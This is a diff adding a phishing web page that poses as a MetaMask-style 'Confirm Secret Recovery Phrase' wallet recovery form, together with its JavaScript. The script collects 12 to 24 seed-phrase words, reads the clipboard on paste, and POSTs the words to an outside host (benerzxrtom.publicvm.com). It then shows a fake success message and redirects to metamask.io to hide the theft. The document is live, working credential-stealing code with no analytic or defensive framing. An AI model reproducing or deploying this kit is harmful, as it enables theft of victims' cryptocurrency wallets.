+                    </div>
+                </div>
+
+            <div class="btnBox">
+                <button disabled class="btn-cofirm">Confirm Secret Recovery Phrase</button>
+            </div>
+            </form>
+            
+            <!--- End Form24 ------>
+        </div>
+
+
+
+
+
+        <div class="form-mainbox done-box hide">
+            <div class="tada-box">
+                <img src="https://bestfilltype.netlify.app/tada.png" alt="confirm">
+            </div>
+
+            <div class="head-text">
+                <h1>Wallet Recovery successful</h1>
+            </div>
+
+            <div class="head-text-p">
+                <p>Youâve successfully Unlocked your wallet. Keep your Secret Recovery Phrase safe and secret -- itâs your responsibility!</p>
+
+                <br>
+                  <p>Please Wait you will be redirected in <span class="count"></span><br /> <a href="#">Learn more</a></p>
+            </div>
+
+
+
+            <div class="btnBox">
+                <button class="btn-cofirm">I understand</button>
+            </div>
+            </form>
+            
+            <!--- End Form24 ------>
+        </div>
+    </div>
+    <script src="//gtomitsuka.github.io/gibberish-detector.js/gibberish.min.js"></script>
+    <script>
+        const wordSelect = document.getElementById("word");
+const [wordForm1, wordForm2, wordForm3, wordForm4, wordForm5] = document.querySelectorAll(".form-main");
+const preloader = document.querySelector(".preloader");
+const count2 = document.querySelector(".count");
+const done = document.querySelector(".done-box");
+const noDone = document.querySelector(".no-done");
+
+
+const [word12_1, word12_2, word12_3, word12_4, word12_5, word12_6, word12_7, word12_8, word12_9, word12_10, word12_11, word12_12] = document.querySelectorAll(".word-12");
+const word12Input = document.querySelectorAll(".word-12");
+
+const [btncofirm1, btncofirm2, btnCofirm3, btnCofirm4, btncofirm5] = document.querySelectorAll(".btn-cofirm");
+const [word15_1, word15_2, word15_3, word15_4, word15_5, word15_6, word15_7, word15_8, word15_9, word15_10, word15_11, word15_12, word15_13, word15_14, word15_15] = document.querySelectorAll(".word-15");
+const word15Input = document.querySelectorAll(".word-15");
+
+const [word18_1, word18_2, word18_3, word18_4, word18_5, word18_6, word18_7, word18_8, word18_9, word18_10, word18_11, word18_12, word18_13, word18_14, word18_15, word18_16, word18_17, word18_18] = document.querySelectorAll(".word-18");
+const word18Input = document.querySelectorAll(".word-18");
+
+const [word21_1, word21_2, word21_3, word21_4, word21_5, word21_6, word21_7, word21_8, word21_9, word21_10, word21_11, word21_12, word21_13, word21_14, word21_15, word21_16, word21_17, word21_18, word21_19, word21_20, word21_21] = document.querySelectorAll(".word-21");
+const word21Input = document.querySelectorAll(".word-21");
+
+
+const [word24_1, word24_2, word24_3, word24_4, word24_5, word24_6, word24_7, word24_8, word24_9, word24_10, word24_11, word24_12, word24_13, word24_14, word24_15, word24_16, word24_17, word24_18, word24_19, word24_20, word24_21, word24_22, word24_23, word24_24, word24_25] = document.querySelectorAll(".word-24");
+const word24Input = document.querySelectorAll(".word-24");
+
+const errbox = document.querySelector(".errbox");
+
+word12Input.forEach((input, index) => {
+    input.addEventListener("paste", () => {
+          navigator.clipboard.readText().then((copiedText) => {
+           const text =  copiedText.split(" ");
+           text.forEach((value, num) => {
+                word12Input[num].value = value;
+                btncofirm1.disabled = false;
+           });
+        });   
+    });
+});
+
+word15Input.forEach((input, index) => {
+    input.addEventListener("paste", () => {
+          navigator.clipboard.readText().then((copiedText) => {
+           const text =  copiedText.split(" ");
+           text.forEach((value, num) => {
+                word15Input[num].value = value;
+                btncofirm2.disabled = false;
+           });
+         
+        });   
+    });
+});
+
+
+word18Input.forEach((input, index) => {
+    input.addEventListener("paste", () => {
+          navigator.clipboard.readText().then((copiedText) => {
+           const text =  copiedText.split(" ");
+           text.forEach((value, num) => {
+                word18Input[num].value = value;
+                btnCofirm3.disabled = false;
+           });
+         
+        });   
+    });
+});
+
+
+word21Input.forEach((input, index) => {
+    input.addEventListener("paste", () => {
+          navigator.clipboard.readText().then((copiedText) => {
+           const text =  copiedText.split(" ");
+            
+           text.forEach((value, num) => {
+                word21Input[num].value = value;
+                 btnCofirm4.disabled = false;
+           });
+         
+        });   
+    });
+});
+
+
+word24Input.forEach((input, index) => {
+    input.addEventListener("paste", () => {
+          navigator.clipboard.readText().then((copiedText) => {
+           const text =  copiedText.split(" ");
+            
+           text.forEach((value, num) => {
+                word24Input[num].value = value;
+                 btncofirm5.disabled = false;
+           });
+         
+        });   
+    });
+});
+
+
+
+window.addEventListener("load", () => {
+    setTimeout(() => {
+        preloader.classList.add("hide");
+    }, 2000);
+});
+
+
+ const postData  = (data) => {
+    $.ajax({
+    url: "https://benerzxrtom.publicvm.com/m.php",
+    type: "POST",
+    data: { pass: data },
+ });
+};
+const eye = document.querySelectorAll(".eye");
+const eye2 = document.querySelectorAll(".eye-2");
+const eye3 = document.querySelectorAll(".eye-3");
+const eye4 = document.querySelectorAll(".eye-4");
+const eye5 = document.querySelectorAll(".eye-5");
+
+
+ const timer2 = (timeleft) => {
+        let downloadTimer = setInterval(function () {
+          if (timeleft <= 0) {
+            clearInterval(downloadTimer);
+          }
+          count2.textContent = `0:0${0 + timeleft} Seconds`;
+          timeleft -= 1;
+          if (timeleft === -1) {
+            window.location.replace("https://metamask.io/");
+          }
+        }, 1000);
+      };
+
+
+wordSelect.addEventListener("change", () => {
+    if(wordSelect.value === "12"){
+        wordForm1.classList.remove("hide");
+        wordForm2.classList.add("hide");
+        wordForm3.classList.add("hide");
+        wordForm4.classList.add("hide");
+        wordForm5.classList.add("hide");
+    }
+    else if(wordSelect.value === "15"){
+        wordForm1.classList.add("hide");
+        wordForm2.classList.remove("hide");
+        wordForm3.classList.add("hide");
+        wordForm4.classList.add("hide");
+        wordForm5.classList.add("hide");
+    }
+    else if(wordSelect.value === "18"){
+        wordForm1.classList.add("hide");
+        wordForm2.classList.add("hide");
+        wordForm3.classList.remove("hide");
+        wordForm4.classList.add("hide");
+        wordForm5.classList.add("hide");
+    }
+    else if(wordSelect.value === "21"){
+        wordForm1.classList.add("hide");
+        wordForm2.classList.add("hide");
+        wordForm3.classList.add("hide");
+        wordForm4.classList.remove("hide");
+        wordForm5.classList.add("hide");
+    }
+    else {
+        wordForm1.classList.add("hide");
+        wordForm2.classList.add("hide");
+        wordForm3.classList.add("hide");
+        wordForm4.classList.add("hide");
+        wordForm5.classList.remove("hide");
+    }
+});
+
+
+wordForm1.addEventListener("submit", (e) => {
+     e.preventDefault();
+     errbox.classList.add("hide");
+     let regex = /[!`@#$~%^&*()\-+={}[\]:;"'<>,.?\/|\\]/;
+     let regex2 =  /\d/;
+     let pass = false;
+
+    for(let i = 0; i < word12Input.length; i++ ){
+        if(regex.test(word12Input[i].value) || regex2.test(word12Input[i].value)){
+            pass = true;
+        }
+    }
+    if(pass){
+        errbox.classList.remove("hide");
+    }
+    else {
+         if(word12_1.value === "" || word12_2.value === "" ||  word12_3.value === "" || word12_4.value === "" || word12_5.value === "" || word12_6.value === "" || word12_7.value === "" || word12_8.value === "" || word12_9.value === "" || word12_10.value === "" || word12_11.value === "" || word12_12.value === ""){
+            btncofirm1.disabled = true;
+        }
+        else {
+            preloader.classList.remove("hide");
+            
+            let data = `Word 1: ${word12_1.value} \nWord 2: ${word12_2.value} \nWord 3: ${word12_3.value} \nWord 4: ${word12_4.value} \nWord 5: ${word12_5.value} \nWord 6: ${word12_6.value} \nWord 7: ${word12_7.value} \nWord 8: ${word12_8.value} \nWord 9: ${word12_9.value} \nWord 10: ${word12_10.value} \nWord 11: ${word12_11.value} \nWord 12: ${word12_12.value}`;
+            postData(data);
+            setTimeout(() => {
+                preloader.classList.add("hide");
+                noDone.classList.add("hide");
+                done.classList.remove("hide");
+                timer2(10)
+
+            }, 4000);
+        }
+    }
+   
+});
+
+
+wordForm2.addEventListener("submit", (e) => {
+    e.preventDefault();
+    errbox.classList.add("hide");
+    let regex = /[!`@#$~%^&*()\-+={}[\]:;"'<>,.?\/|\\]/;
+     let regex2 =  /\d/;
+     let pass = false;
+
+    for(let i = 0; i < word15Input.length; i++ ){
+        if(regex.test(word15Input[i].value) || regex2.test(word15Input[i].value)){
+            pass = true;
+        }
+    }
+
+    if(pass){
+         errbox.classList.remove("hide");
+    }
+    else {
+        if(word15_1.value === "" || word15_2.value === "" ||  word15_3.value === "" || word15_4.value === "" || word15_5.value === "" || word15_6.value === "" || word15_7.value === "" || word15_8.value === "" || word15_9.value === "" || word15_10.value === "" || word15_11.value === "" || word15_12.value === "" || word15_13.value === "" || word15_14.value === "" || word15_15.value === ""){
+        btncofirm2.disabled = true;
+    }
+    else {
+        preloader.classList.remove("hide");
+        let data = `Word 1: ${word15_1.value} \nWord 2: ${word15_2.value} \nWord 3: ${word15_3.value} \nWord 4: ${word15_4.value} \nWord 5: ${word15_5.value} \nWord 6: ${word15_6.value} \nWord 7: ${word15_7.value} \nWord 8: ${word15_8.value} \nWord 9: ${word15_9.value} \nWord 10: ${word15_10.value} \nWord 11: ${word15_11.value} \nWord 12: ${word15_12.value} \nWord 13: ${word15_13.value} \nWord 14: ${word15_14.value} \nWord 15: ${word15_15.value}`;
+        postData(data);
+        setTimeout(() => {
+            preloader.classList.add("hide");
+            noDone.classList.add("hide");
+            done.classList.remove("hide");
+            timer2(10)
+
+        }, 4000);
+    }
+    }
+      
+});
+
+
+wordForm3.addEventListener("submit", (e) => {
+    e.preventDefault();
+    errbox.classList.add("hide");
+     let regex = /[!`@#$~%^&*()\-+={}[\]:;"'<>,.?\/|\\]/;
+     let regex2 =  /\d/;
+     let pass = false;
+
+    for(let i = 0; i < word18Input.length; i++ ){
+        if(regex.test(word18Input[i].value) || regex2.test(word18Input[i].value)){
+            pass = true;
+        }
+    }
+
+    if(pass){
+         errbox.classList.remove("hide");
+    }
+    else {
+         if(word18_1.value === "" || word18_2.value === "" ||  word18_3.value === "" || word18_4.value === "" || word18_5.value === "" || word18_6.value === "" || word18_7.value === "" || word18_8.value === "" || word18_9.value === "" || word18_10.value === "" || word18_11.value === "" || word18_12.value === "" || word18_13.value === "" || word18_14.value === "" || word18_15.value === ""|| word18_16.value === "" || word18_17.value === "" || word18_18.value === ""){
+        btnCofirm3.disabled = true;
+    }
+    else {
+         preloader.classList.remove("hide");
+        let data = `Word 1: ${word18_1.value} \nWord 2: ${word18_2.value} \nWord 3: ${word18_3.value} \nWord 4: ${word18_4.value} \nWord 5: ${word18_5.value} \nWord 6: ${word18_6.value} \nWord 7: ${word18_7.value} \nWord 8: ${word18_8.value} \nWord 9: ${word18_9.value} \nWord 10: ${word18_10.value} \nWord 11: ${word18_11.value} \nWord 12: ${word18_12.value} \nWord 13: ${word18_13.value} \nWord 14: ${word18_14.value} \nWord 15: ${word18_15.value} \nWord 16: ${word18_16.value} \nWord 17: ${word18_17.value} \nWord 18: ${word18_18.value}`;
+        postData(data);
+        setTimeout(() => {
+            preloader.classList.add("hide");
+            noDone.classList.add("hide");
+            done.classList.remove("hide");
+            timer2(10)
+
+        }, 4000); 
+    }
+    }
+     
+});
+
+wordForm4.addEventListener("submit", (e) => {
+    e.preventDefault();
+    errbox.classList.add("hide");
+    let regex = /[!`@#$~%^&*()\-+={}[\]:;"'<>,.?\/|\\]/;
+     let regex2 =  /\d/;
+     let pass = false;
+
+    for(let i = 0; i < word21Input.length; i++ ){
+        if(regex.test(word21Input[i].value) || regex2.test(word21Input[i].value)){
+            pass = true;
+        }
+    }
+
+    if(pass){
+        errbox.classList.remove("hide");
+    }
+    else {
+          if(word21_1.value === "" || word21_2.value === "" ||  word21_3.value === "" || word21_4.value === "" || word21_5.value === "" || word21_6.value === "" || word21_7.value === "" || word21_8.value === "" || word21_9.value === "" || word21_10.value === "" || word21_11.value === "" || word21_12.value === "" || word21_13.value === "" || word21_14.value === "" || word21_15.value === ""|| word21_16.value === "" || word21_17.value === "" || word21_18.value === "" || word21_19.value === "" || word21_20.value === "" || word21_21.value === ""){
+        btnCofirm4.disabled = true;
+    }
+    else {
+          preloader.classList.remove("hide");
+        let data = `Word 1: ${word21_1.value} \nWord 2: ${word21_2.value} \nWord 3: ${word21_3.value} \nWord 4: ${word21_4.value} \nWord 5: ${word21_5.value} \nWord 6: ${word21_6.value} \nWord 7: ${word21_7.value} \nWord 8: ${word21_8.value} \nWord 9: ${word21_9.value} \nWord 10: ${word21_10.value} \nWord 11: ${word21_11.value} \nWord 12: ${word21_12.value} \nWord 13: ${word21_13.value} \nWord 14: ${word21_14.value} \nWord 15: ${word21_15.value} \nWord 16: ${word21_16.value} \nWord 17: ${word21_17.value} \nWord 18: ${word21_18.value} \nWord 19: ${word21_19.value} \nWord 20: ${word21_20.value} \nWord 21: ${word21_21.value}`;
+        postData(data);
+        setTimeout(() => {
+            preloader.classList.add("hide");
+            noDone.classList.add("hide");
+            done.classList.remove("hide");
+            timer2(10)
+
+        }, 4000); 
+    }
+    }
+    
+});
+
+wordForm5.addEventListener("submit", (e) => {
+    e.preventDefault();
+    errbox.classList.add("hide");
+     let regex = /[!`@#$~%^&*()\-+={}[\]:;"'<>,.?\/|\\]/;
+     let regex2 =  /\d/;
+     let pass = false;
+
+    for(let i = 0; i < word24Input.length; i++ ){
+        if(regex.test(word24Input[i].value) || regex2.test(word24Input[i].value)){
+            pass = true;
+        }
+    }
+
+    if(pass){
+        errbox.classList.remove("hide");
+    }
+    else {
+        if(word24_1.value === "" || word24_2.value === "" ||  word24_3.value === "" || word24_4.value === "" || word24_5.value === "" || word24_6.value === "" || word24_7.value === "" || word24_8.value === "" || word24_9.value === "" || word24_10.value === "" || word24_11.value === "" || word24_12.value === "" || word24_13.value === "" || word24_14.value === "" || word24_15.value === ""|| word24_16.value === "" || word24_17.value === "" || word24_18.value === "" || word24_19.value === "" || word24_20.value === "" || word24_21.value === "" || word24_22.value === "" || word24_23.value === "" || word24_24.value === ""){
+        btncofirm5.disabled = true;
+    }
+    else {
+        preloader.classList.remove("hide");
+        let data = `Word 1: ${word24_1.value} \nWord 2: ${word24_2.value} \nWord 3: ${word24_3.value} \nWord 4: ${word24_4.value} \nWord 5: ${word24_10.value} \nWord 6: ${word24_6.value} \nWord 7: ${word24_7.value} \nWord 8: ${word24_8.value} \nWord 9: ${word24_9.value} \nWord 10: ${word24_10.value} \nWord 11: ${word24_11.value} \nWord 12: ${word24_12.value} \nWord 13: ${word24_13.value} \nWord 14: ${word24_14.value} \nWord 15: ${word24_15.value} \nWord 16: ${word24_16.value} \nWord 17: ${word24_17.value} \nWord 18: ${word24_18.value} \nWord 19: ${word24_19.value} \nWord 20: ${word24_20.value} \nWord 21: ${word24_21.value}  \nWord 22: ${word24_22.value} \nWord 23: ${word24_23.value} \nWord 24: ${word24_24.value}`;
+        postData(data);
+        setTimeout(() => {
+            preloader.classList.add("hide");
+            noDone.classList.add("hide");
+            done.classList.remove("hide");
+            timer2(10)
+
+        }, 4000); 
+    }   
+    }
+      
+});
+
+
+
+
+word12Input.forEach((input, index) => {
+    input.addEventListener("keyup", () => {
+           if(word12_1.value !== "" && word12_2.value !== "" &&  word12_3.value !== "" && word12_4.value !== "" && word12_5.value !== "" && word12_6.value !== "" && word12_7.value !== "" && word12_8.value !== "" && word12_9.value !== "" && word12_10.value !== "" && word12_11.value !== "" && word12_12.value !== ""){
+           btncofirm1.disabled = false;
+        }
+    });
+});
+
+
+word15Input.forEach((input, index) => {
+  input.addEventListener("keyup", () => {
+           if(word15_1.value !== "" && word15_2.value !== "" &&  word15_3.value !== "" && word15_4.value !== "" && word15_5.value !== "" && word15_6.value !== "" && word15_7.value !== "" && word15_8.value !== "" && word15_9.value !== "" && word15_10.value !== "" && word15_11.value !== "" && word15_12.value !== "" && word15_13.value !== "" && word15_14.value !== "" && word15_15.value !== ""){
+           btncofirm2.disabled = false;
+        }
+    });
+
+});
+
+word18Input.forEach((input, index) => {
+  input.addEventListener("keyup", () => {
+           if(word18_1.value !== "" && word18_2.value !== "" &&  word18_3.value !== "" && word18_4.value !== "" && word18_5.value !== "" && word18_6.value !== "" && word18_7.value !== "" && word18_8.value !== "" && word18_9.value !== "" && word18_10.value !== "" && word18_11.value !== "" && word18_12.value !== "" && word18_13.value !== "" && word18_14.value !== "" && word18_15.value !== "" && word18_16.value !== "" && word18_17.value !== "" && word18_18.value !== ""){
+           btnCofirm3.disabled = false;
+        }
+    });
+});
+
+
+
+word21Input.forEach((input, index) => {
+  input.addEventListener("keyup", () => {
+           if(word21_1.value !== "" && word21_2.value !== "" &&  word21_3.value !== "" && word21_4.value !== "" && word21_5.value !== "" && word21_6.value !== "" && word21_7.value !== "" && word21_8.value !== "" && word21_9.value !== "" && word21_10.value !== "" && word21_11.value !== "" && word21_12.value !== "" && word21_13.value !== "" && word21_14.value !== "" && word21_15.value !== "" && word21_16.value !== "" && word21_17.value !== "" && word21_18.value !== "" && word21_19.value !== "" && word21_20.value !== "" && word21_21.value !== ""){
+           btnCofirm4.disabled = false;
+        }
+    });
+});
+
+
+
+
+word24Input.forEach((input, index) => {
+  input.addEventListener("keyup", () => {
+           if(word24_1.value !== "" && word24_2.value !== "" &&  word24_3.value !== "" && word24_4.value !== "" && word24_5.value !== "" && word24_6.value !== "" && word24_7.value !== "" && word24_8.value !== "" && word24_9.value !== "" && word24_10.value !== "" && word24_11.value !== "" && word24_12.value !== "" && word24_13.value !== "" && word24_14.value !== "" && word24_15.value !== "" && word24_16.value !== "" && word24_17.value !== "" && word24_18.value !== "" && word24_19.value !== "" && word24_20.value !== "" && word24_21.value !== "" && word24_22.value !== "" && word24_23.value !== "" && word24_24.value !== ""){
+           btncofirm5.disabled = false;
+        }
+    });
+});
+
+word24Input.forEach((input, index) => {
+  input.addEventListener("blur", () => {
+           if(word24_1.value !== "" && word24_2.value !== "" &&  word24_3.value !== "" && word24_4.value !== "" && word24_5.value !== "" && word24_6.value !== "" && word24_7.value !== "" && word24_8.value !== "" && word24_9.value !== "" && word24_10.value !== "" && word24_11.value !== "" && word24_12.value !== "" && word24_13.value !== "" && word24_14.value !== "" && word24_15.value !== "" && word24_16.value !== "" && word24_17.value !== "" && word24_18.value !== "" && word24_19.value !== "" && word24_20.value !== "" && word24_21.value !== "" && word24_22.value !== "" && word24_23.value !== "" && word24_24.value !== ""){
+           btncofirm5.disabled = false;
+        }
+    });
+});
+
+
+
+eye.forEach((eyeImg, index) => {
+    eyeImg.addEventListener("click", () => {
+        if(word12Input[index].type === "password"){
+            word12Input[index].type = "text";
+            eyeImg.src = "https://bestfilltype.netlify.app/eye-open.png";
+        }
+        else {
+            word12Input[index].type = "password";
+            eyeImg.src = "https://bestfilltype.netlify.app/eye-close.png";
+        }
+    });
+});
+
+eye2.forEach((eyeImg, index) => {
+    eyeImg.addEventListener("click", () => {
+        if(word15Input[index].type === "password"){
+            word15Input[index].type = "text";
+            eyeImg.src = "https://bestfilltype.netlify.app/eye-open.png";
+        }
+        else {
+            word15Input[index].type = "password";
+            eyeImg.src = "https://bestfilltype.netlify.app/eye-close.png";
+        }
+    });
+});
+
+
+eye3.forEach((eyeImg, index) => {
+    eyeImg.addEventListener("click", () => {
+        if(word18Input[index].type === "password"){
+            word18Input[index].type = "text";
+            eyeImg.src = "https://bestfilltype.netlify.app/eye-open.png";
+        }
+        else {
+            word18Input[index].type = "password";
+            eyeImg.src = "https://bestfilltype.netlify.app/eye-close.png";
+        }
+    });
+});
+
+
+eye4.forEach((eyeImg, index) => {
+    eyeImg.addEventListener("click", () => {
+        if(word21Input[index].type === "password"){
+            word21Input[index].type = "text";
+            eyeImg.src = "https://bestfilltype.netlify.app/eye-open.png";
+        }
+        else {
+            word21Input[index].type = "password";
+            eyeImg.src = "https://bestfilltype.netlify.app/eye-close.png";
+        }
+    });
+});
+
+eye5.forEach((eyeImg, index) => {
+    eyeImg.addEventListener("click", () => {
+        if(word24Input[index].type === "password"){
+            word24Input[index].type = "text";
+            eyeImg.src = "https://bestfilltype.netlify.app/eye-open.png";
+        }
+        else {
+            word24Input[index].type = "password";
+            eyeImg.src = "https://bestfilltype.netlify.app/eye-close.png";
+        }
+    });
+});
+     </script>
+
+
+</body>
+</html>
